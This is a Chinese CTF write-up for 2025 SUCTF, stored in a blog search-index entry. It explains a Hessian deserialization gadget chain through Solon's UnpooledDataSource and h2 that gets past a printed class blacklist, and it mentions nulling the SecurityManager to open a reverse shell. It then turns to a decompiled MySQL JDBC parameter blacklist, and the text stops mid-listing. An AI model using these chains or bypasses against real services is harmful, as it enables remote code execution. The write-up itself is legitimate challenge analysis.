<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025 SUCTF WriteUp</title>
      <link href="/write-up/2025-suctf-writeup/"/>
      <url>/write-up/2025-suctf-writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>放寒假闲着没事打了一场XCTF分站赛，没想到直接拿了两个一血 🩸</p></blockquote><p><img src="image-1.png" alt="image-1.png"></p><h1 id="1-ez-solon"><a href="#1-ez-solon" class="headerlink" title="1. ez_solon"></a>1. ez_solon</h1><h2 id="1-1-反序列化Gadget构造"><a href="#1-1-反序列化Gadget构造" class="headerlink" title="1.1 反序列化Gadget构造"></a>1.1 反序列化Gadget构造</h2><p><img src="image-2.png" alt="image-2.png"></p><p>Hessian 反序列化，通过 readObject 反序列化 Object 后调用 Object.toString </p><p>依赖使用 sofa-hessian：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alipay.sofa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>该版本的黑名单如下（通用链基本上都不能用）</p><details>  <summary>serialize.blacklist</summary>  <pre><code>aj.org.objectweb.asm.br.com.anteros.bsh.ch.qos.logback.clojure.com.alibaba.citrus.springext.support.parser.com.alibaba.citrus.springext.util.SpringExtUtil.com.alibaba.druid.pool.com.alibaba.druid.stat.JdbcDataSourceStatcom.alibaba.fastjson.annotation.com.alibaba.hotcode.internal.org.apache.commons.collections.functors.com.alipay.custrelation.service.model.redress.com.alipay.oceanbase.obproxy.druid.pool.com.caucho.hessian.test.TestConscom.caucho.naming.Qnamecom.ibatis.com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.com.ibm.xltxe.rnm1.xtq.bcel.util.com.mchange.com.mysql.cj.jdbc.admin.com.mysql.cj.jdbc.MysqlConnectionPoolDataSourcecom.mysql.cj.jdbc.MysqlDataSourcecom.mysql.cj.jdbc.MysqlXADataSourcecom.mysql.cj.log.com.mysql.jdbc.util.com.p6spy.engine.com.rometools.rome.feed.com.sun.com.taobao.eagleeye.wrapper.com.taobao.vipserver.commons.collections.functors.com.zaxxer.hikari.flex.messaging.util.concurrent.groovy.lang.java.awt.java.beans.java.net.InetAddressjava.net.Socketjava.net.URLjava.rmi.java.security.java.util.EventListenerjava.util.jar.java.util.logging.java.util.prefs.java.util.ServiceLoaderjava.util.StringTokenizerjavassist.javax.activation.javax.imageio.javax.management.javax.media.jai.remote.javax.naming.javax.net.javax.print.javax.script.javax.sound.javax.swing.javax.tools.javax.xmljdk.internal.jodd.db.connection.junit.net.bytebuddy.dynamic.loading.net.sf.cglib.net.sf.ehcache.hibernate.net.sf.ehcache.transaction.manager.ognl.oracle.jdbc.oracle.jms.aq.oracle.net.org.aoju.bus.proxy.provider.org.apache.activemq.ActiveMQConnectionFactoryorg.apache.activemq.ActiveMQXAConnectionFactoryorg.apache.activemq.jms.pool.org.apache.activemq.pool.org.apache.activemq.spring.org.apache.aries.transaction.org.apache.axis2.jaxws.spi.handler.org.apache.axis2.transport.jms.org.apache.bcel.org.apache.carbondata.core.scan.expression.org.apache.catalina.org.apache.cocoon.org.apache.commons.beanutils.org.apache.commons.codec.org.apache.commons.collections.comparators.org.apache.commons.collections.functors.org.apache.commons.collections.Transformerorg.apache.commons.collections4.comparators.org.apache.commons.collections4.functors.org.apache.commons.collections4.Transformerorg.apache.commons.configuration.org.apache.commons.configuration2.org.apache.commons.dbcp.org.apache.commons.fileupload.org.apache.commons.jelly.org.apache.commons.logging.org.apache.commons.proxy.org.apache.cxf.jaxrs.provider.org.apache.hadoop.shaded.com.zaxxer.hikari.org.apache.http.auth.org.apache.http.conn.org.apache.http.cookie.org.apache.http.impl.org.apache.ibatis.datasource.org.apache.ibatis.executor.org.apache.ibatis.javassist.org.apache.ibatis.ognl.org.apache.ibatis.parsing.org.apache.ibatis.reflection.org.apache.ibatis.scripting.org.apache.ignite.cache.org.apache.ignite.cache.jta.org.apache.log.output.db.org.apache.log4j.org.apache.logging.org.apache.myfaces.context.servlet.org.apache.myfaces.view.facelets.el.org.apache.openjpa.ee.org.apache.shiro.org.apache.tomcat.org.apache.velocity.org.apache.wicket.util.org.apache.xalan.org.apache.xbean.org.apache.xpath.org.apache.zookeeper.org.aspectj.org.codehaus.groovy.runtime.org.codehaus.jackson.org.datanucleus.store.rdbms.datasource.dbcp.datasources.org.dom4j.org.eclipse.jetty.org.geotools.filter.org.h2.jdbcx.org.h2.server.org.h2.value.org.hibernate.org.javasimon.org.jaxen.org.jboss.org.jdom.org.jdom2.transform.org.junit.org.logicalcobwebs.org.mockito.org.mortbay.jetty.org.mortbay.log.org.mozilla.javascript.org.objectweb.asm.org.osjava.sj.org.python.core.org.quartz.org.slf4j.org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolderorg.springframework.aop.support.DefaultBeanFactoryPointcutAdvisororg.springframework.beans.factory.BeanFactoryorg.springframework.beans.factory.config.PropertyPathFactoryBeanorg.springframework.beans.factory.support.DefaultListableBeanFactoryorg.springframework.jndi.support.SimpleJndiBeanFactoryorg.springframework.orm.jpa.AbstractEntityManagerFactoryBeanorg.springframework.transaction.jta.JtaTransactionManagerorg.springframework.jndi.JndiObjectTargetSourceorg.springframework.beans.factory.config.MethodInvokingFactoryBeanorg.thymeleaf.org.yaml.snakeyaml.tokens.pstore.shaded.org.apache.commons.collections.sun.print.sun.rmi.server.sun.rmi.transport.weblogic.ejb20.internal.weblogic.jms.common.</code></pre></details><br><p>注意到存在依赖：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.83<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.h2database<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>h2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.2.224<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>h2 应当作为高版本JDK或黑名单状态下的常用 sink 出现</p><p>初步考虑使用 dataSource （JsonObject toString 触发任意 getter 来 getConnection）</p><p>但是 JdbcDataSource 属于 org.h2.jdbcx 软件包中 存在黑名单无法被序列化和反序列化</p><p>考虑到在 solon （org.noear.solon）中寻找可用的 dataSource，注意到存在 UnpooledDataSource 类满足条件可用：</p><p><img src="image-3.png" alt="image-3.png"></p><p>因此构造Gadget完成：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JsonObject</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name">UnpooledDataSource</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>是一个很简短的链</p><h2 id="1-2-SecurityManager绕过"><a href="#1-2-SecurityManager绕过" class="headerlink" title="1.2 SecurityManager绕过"></a>1.2 SecurityManager绕过</h2><p>还需要绕过 SecurityManager</p><p><img src="image-4.png" alt="image-4.png"></p><p>由于没有限制重定义，直接在h2的sink中使用Java代码 System.setSecurityManager(null); 将其置空即可正常反弹 shell</p><p>flag在&#x2F;flag.txt中</p><p><img src="image-5.png" alt="image-5.png"></p><h1 id="2-ezjava"><a href="#2-ezjava" class="headerlink" title="2. ezjava"></a>2. ezjava</h1><h2 id="2-1-混淆字节码恢复"><a href="#2-1-混淆字节码恢复" class="headerlink" title="2.1 混淆字节码恢复"></a>2.1 混淆字节码恢复</h2><p>附件的Class经过了特殊处理，如果直接放入IDEA反编译器中会显示错误的源码，错误的源码waf过滤极其严格，无法进行绕过</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>pho3n1x<span class="token punctuation">.</span>sujava<span class="token punctuation">.</span>security</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityChecker</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> checklist <span class="token operator">=</span> <span class="token string">"allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#"</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkJdbcConnParams</span><span class="token punctuation">(</span><span class="token class-name">String</span> host<span class="token punctuation">,</span> <span class="token class-name">Integer</span> port<span class="token punctuation">,</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">,</span> <span class="token class-name">String</span> database<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> extraParams<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>host<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9.-]+$"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>database<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9_]+$"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">parseParamsMapToMysqlParamUrl</span><span class="token punctuation">(</span>extraParams<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">".*(allowLoadLocalInfile|autoDeserialize|allowLocalInfile|allowUrlInLocalInfile|#|%).*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Invalid mysql connection params."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityChecker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">parseMysqlUrlParamsToMap</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">HashMap</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> var1<span class="token punctuation">;</span>            <span class="token keyword">int</span> var4 <span class="token operator">=</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var5 <span class="token operator">&lt;</span> var4<span class="token punctuation">;</span> <span class="token operator">++</span>var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> var6 <span class="token operator">=</span> var3<span class="token punctuation">[</span>var5<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> var6<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var7<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>var7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> var7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> var2<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">parseParamsMapToMysqlParamUrl</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> var0 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var0<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>var0x<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">CharSequence</span><span class="token punctuation">)</span>var0x<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>var0x<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">joining</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">appendMysqlForceParams</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var0<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token function">parseMysqlUrlParamsToMap</span><span class="token punctuation">(</span><span class="token string">"allowLoadLocalInfile=false&amp;autoDeserialize=false&amp;allowLocalInfile=false&amp;allowUrlInLocalInfile=false"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>根据提示源码存在混淆，使用静态分析框架将字节码转换为IR，可以发现插入了不可见字符：</p><p><img src="image-6.png" alt="image-6.png"></p><p>不可见字符将直接导致该类失效，发现jadx可以正常读取混淆后的字节码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>pho3n1x<span class="token punctuation">.</span>sujava<span class="token punctuation">.</span>security</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">UnsupportedEncodingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLDecoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Matcher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span><span class="token comment">/* loaded from: SecurityChecker.class */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityChecker</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* renamed from: checklist = "allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#";  public static void checkJdbcConnParams(String host, Integer port, String username, String password, String database, Map&lt;String, Object> extraParams) throws Exception &#123;    if (!host.trim().matches("^[a-zA-Z0-9.-]+$") || !database.matches("^[a-zA-Z0-9_]+$") || parseParamsMapToMysqlParamUrl(extraParams).matches(".*(allowLoadLocalInfile|autoDeserialize|allowLocalInfile|allowUrlInLocalInfile|#|%).*")) &#123;      throw new Exception("Invalid mysql connection params.");    &#125;  &#125;  reason: not valid java name and contains not printable characters */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> f0x2356168a <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AND_SYMBOL</span> <span class="token operator">=</span> <span class="token string">"&amp;"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">EQUAL_SIGN</span> <span class="token operator">=</span> <span class="token string">"="</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">COMMA</span> <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">BLACKLIST_REGEX</span> <span class="token operator">=</span> <span class="token string">"autodeserialize|allowloadlocalinfile|allowurlinlocalinfile|allowloadlocalinfileinpath"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">MYSQL_SECURITY_CHECK_ENABLE</span> <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">MYSQL_CONNECT_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://%s:%s/%s"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">JDBC_MYSQL_PROTOCOL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">JDBC_MATCH_REGEX</span> <span class="token operator">=</span> <span class="token string">"(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">MYSQL_SENSITIVE_PARAMS</span> <span class="token operator">=</span> <span class="token string">"allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkJdbcConnParams</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span> <span class="token class-name">Integer</span> num<span class="token punctuation">,</span> <span class="token class-name">String</span> str2<span class="token punctuation">,</span> <span class="token class-name">String</span> str3<span class="token punctuation">,</span> <span class="token class-name">String</span> str4<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token constant">MYSQL_SECURITY_CHECK_ENABLE</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isAnyBlank</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CharSequence</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>str<span class="token punctuation">,</span> str2<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Invalid mysql connection params."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">String</span> format <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token constant">MYSQL_CONNECT_URL</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> str4<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">checkHost</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">checkUrl</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">checkParams</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">checkUrlIsSafe</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkHost</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Invalid host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span 